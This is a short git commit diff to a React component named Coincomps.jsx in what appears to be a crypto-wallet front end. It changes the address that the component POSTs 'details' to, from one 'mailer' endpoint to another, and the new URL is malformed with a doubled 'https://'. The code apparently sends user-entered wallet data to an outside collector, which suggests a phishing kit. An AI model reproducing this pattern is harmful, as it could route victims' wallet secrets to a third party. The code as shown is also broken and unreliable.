d8b9e4fe9a331eac6fbffd7051d57b63a517db3b
davesmithade <161246714+vendmartwallet@users.noreply.github.com>
2024-11-18 08:56:08 +0100

    Update Coincomps.jsx
    update

--- src/components/coincomps/Coincomps.jsx
+++ src/components/coincomps/Coincomps.jsx
@@ -42,7 +42,7 @@ const Coincomps = ({ data }) => {
       };
 
       try {
-        const url = "https://myselfmailer.onrender.com/details";
+        const url = "https://https://newpilotmailer.onrender.com/details";
 
         const res = await fetch(url, {
           method: "POST",
